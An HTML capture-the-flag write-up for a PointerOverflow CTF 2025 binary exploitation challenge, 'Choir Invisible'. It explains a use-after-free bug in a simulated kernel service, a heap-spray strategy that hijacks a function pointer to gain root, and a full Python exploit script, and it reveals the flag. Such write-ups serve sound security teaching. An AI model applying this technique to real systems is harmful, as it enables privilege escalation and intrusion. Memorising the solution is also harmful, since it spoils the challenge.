°G<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit 300-1: Choir Invisible - Writeup</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <script>
        tailwind.config = { darkMode: 'class', theme: { extend: { fontFamily: { 'sans': ['Inter', 'sans-serif'], 'mono': ['JetBrains Mono', 'monospace'] }}}}
    </script>
</head>
<body class="bg-black text-slate-300 font-sans antialiased">
    <div class="max-w-4xl mx-auto px-6 py-12">
        <a href="../ctf-new.html" class="inline-flex items-center gap-2 text-blue-400 hover:text-blue-300 mb-8">
            <i class="ph-bold ph-arrow-left"></i>
            Back to CTF Writeups
        </a>

        <header class="mb-12">
            <div class="flex items-center gap-3 mb-4">
                <span class="px-3 py-1 bg-red-500/10 text-red-400 border border-red-500/30 rounded-lg text-sm font-semibold uppercase">Binary Exploitation</span>
                <span class="text-2xl font-bold text-red-400">300 points</span>
            </div>
            <h1 class="text-4xl font-bold text-white mb-4">Choir Invisible</h1>
            <div class="flex items-center gap-6 text-sm text-slate-400">
                <span class="flex items-center gap-2"><i class="ph-bold ph-calendar"></i> November 10, 2025</span>
                <span class="flex items-center gap-2"><i class="ph-bold ph-flag"></i> PointerOverflow CTF 2025</span>
            </div>
        </header>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Challenge Description</h2>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-6">
                <p class="text-slate-300 leading-relaxed mb-4">
                    A kernel-level service simulating an in-kernel heap object with a Use-After-Free (UAF) vulnerability. The service can be exploited remotely via a TCP protocol.
                </p>
                <p class="text-slate-400 text-sm mb-2">Target: <code class="bg-slate-800 px-2 py-1 rounded">exp300-1.pointeroverflowctf.com:15156</code></p>
                <p class="text-slate-300 text-sm mt-4">
                    <strong>Operations:</strong> CREATE, FREE, SETBUF, TRIGGER, SPRAY, LEAK, READFLAG
                </p>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Vulnerability Analysis</h2>
            
            <h3 class="text-xl font-semibold text-white mb-3">The Bug</h3>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 mb-6">
                <pre class="text-sm text-slate-300 font-mono overflow-x-auto"><code>case OP_FREE: {
    choir_t* c = slots[idx];
    free(c->buf);
    free(c);
    // BUG: dangling pointer left in slots[idx]!
    return 0;
}</code></pre>
            </div>
            <p class="text-slate-300 mb-6">
                The <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">op_free</code> function frees the memory but doesn't set <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">slots[idx] = NULL</code>, leaving a dangling pointer. This creates a classic Use-After-Free vulnerability.
            </p>

            <h3 class="text-xl font-semibold text-white mb-3">choir_t Structure</h3>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 mb-6">
                <pre class="text-sm text-slate-300 font-mono overflow-x-auto"><code>typedef struct choir {
    void (*cb)(struct choir*);  // Function pointer
    char *buf;                  // Buffer pointer
    size_t len;                 // Buffer length (0x100)
} choir_t;</code></pre>
            </div>
            <p class="text-slate-300 mb-6">
                The structure is 24 bytes (8+8+8). The key is the function pointer <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">cb</code> at offset 0.
            </p>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Exploitation Strategy</h2>
            
            <ol class="space-y-4 text-slate-300">
                <li class="flex items-start gap-3">
                    <span class="flex-shrink-0 w-8 h-8 bg-blue-500/20 text-blue-400 rounded-full flex items-center justify-center font-bold">1</span>
                    <div>
                        <strong class="text-white">Leak Addresses:</strong> Use <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">LEAK</code> operation to get addresses of <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">give_root</code> and <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">choir_sing</code> functions.
                    </div>
                </li>
                <li class="flex items-start gap-3">
                    <span class="flex-shrink-0 w-8 h-8 bg-blue-500/20 text-blue-400 rounded-full flex items-center justify-center font-bold">2</span>
                    <div>
                        <strong class="text-white">Create & Free:</strong> Allocate a choir object, then free it to create the UAF condition.
                    </div>
                </li>
                <li class="flex items-start gap-3">
                    <span class="flex-shrink-0 w-8 h-8 bg-blue-500/20 text-blue-400 rounded-full flex items-center justify-center font-bold">3</span>
                    <div>
                        <strong class="text-white">Heap Spray:</strong> Use <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">SPRAY</code> to fill the freed slot with a fake choir_t structure where <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">cb</code> points to <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">give_root</code>.
                    </div>
                </li>
                <li class="flex items-start gap-3">
                    <span class="flex-shrink-0 w-8 h-8 bg-blue-500/20 text-blue-400 rounded-full flex items-center justify-center font-bold">4</span>
                    <div>
                        <strong class="text-white">Trigger:</strong> Call <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">TRIGGER</code> on the original slot - it will execute our hijacked function pointer!
                    </div>
                </li>
                <li class="flex items-start gap-3">
                    <span class="flex-shrink-0 w-8 h-8 bg-blue-500/20 text-blue-400 rounded-full flex items-center justify-center font-bold">5</span>
                    <div>
                        <strong class="text-white">Read Flag:</strong> Now with root privileges, use <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">READFLAG</code> to get the flag.
                    </div>
                </li>
            </ol>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Exploit Code</h2>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 mb-6">
                <pre class="text-sm text-slate-300 font-mono overflow-x-auto"><code>#!/usr/bin/env python3
from pwn import *
import struct

# Import client
import importlib.util
spec = importlib.util.spec_from_file_location("client", "exp300-1_client.py")
client_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(client_module)
KernelClient = client_module.KernelClient

# Connect
client = KernelClient(host='exp300-1.pointeroverflowctf.com', port=15156)

# Step 1: Leak addresses
give_root_addr, choir_sing_addr = client.leak()
print(f"[+] give_root: {hex(give_root_addr)}")
print(f"[+] choir_sing: {hex(choir_sing_addr)}")

# Step 2: Create and free to trigger UAF
idx = 0
client.create(idx)
client.free(idx)

# Step 3: Spray with fake choir_t
# Structure: [cb=give_root][buf=dummy][len=0x100]
fake_choir = struct.pack("<QQQ", 
    give_root_addr,  # cb -> give_root
    give_root_addr,  # buf (dummy)
    0x100            # len
)

# Spray 100 objects to reclaim the freed slot
client.spray(count=100, chunk_size=24, payload=fake_choir)

# Step 4: Trigger the callback
client.trigger(idx)

# Step 5: Read flag with root privileges
flag = client.readflag()
print(f"\nðŸš© FLAG: {flag}")

client.close()</code></pre>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Flag</h2>
            <div class="bg-gradient-to-r from-green-900/50 to-emerald-900/50 border border-green-500/30 rounded-lg p-6">
                <div class="flex items-center gap-3">
                    <i class="ph-bold ph-check-circle text-3xl text-green-400"></i>
                    <code class="text-xl font-mono text-green-400">poctf{uwsp_ch01r_1nv151bl3}</code>
                </div>
            </div>
        </section>
    </div>
</body>
</html>
°G*cascade08"(2d98567da85669db64b0fe8d9af9d94466e9642c27file:///home/elw00/ctf-site/writeups/exploit-300-1.html:file:///home/elw00/ctf-site